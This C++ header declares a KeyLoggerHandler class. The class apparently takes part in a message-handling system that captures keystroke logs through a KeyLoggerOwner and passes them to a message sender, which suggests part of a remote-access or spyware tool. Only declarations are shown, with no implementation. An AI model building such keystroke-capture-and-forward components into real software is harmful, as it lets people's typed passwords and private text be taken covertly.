#pragma once

#include "IMessageHandler.h"
#include "IMessageSender.h"
#include "KeyLoggerOwner.h"

class KeyLoggerHandler : public IMessageHandler
{
public:
	explicit KeyLoggerHandler(IMessageSender* sender);

	void Handle(MessageType type, SharedSpan content) override;

private:
	void OnKeyLog(const std::string& log) const;

	IMessageSender* _sender;
	std::unique_ptr<KeyLoggerOwner> _keyLogger;
};

